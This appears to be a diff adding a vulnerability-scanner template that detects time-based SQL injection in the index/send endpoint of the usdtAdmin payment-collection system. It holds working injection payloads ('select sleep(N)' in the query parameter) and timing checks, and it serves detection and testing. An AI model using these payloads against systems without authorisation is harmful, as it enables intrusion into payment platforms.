@@ -1,0 +1,36 @@
+id: poc-yaml-usdtmerchant-send-query-sqli
+info:
+  name: usdtAdmin 收款管理系统 index/send存在SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in the usdtAdmin 收款管理系统 index/send endpoint that allows execution of time-based queries.
+variables:
+  t1: '{{rand_int(5,9)}}'
+  t2: '{{to_number(t1)+2}}'
+  t3: '{{rand_int(1,4)}}'
+  t4: '{{to_number(t3)+2}}'
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/index/index/send?query=select%20sleep({{t1}})'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - len(body) == 0
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
+  - method: GET
+    path:
+      - '{{BaseURL}}/index/index/send?query=select%20sleep({{t3}})'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - len(body) == 0
+          - duration >= to_number(t3)
+          - duration <= to_number(t4)
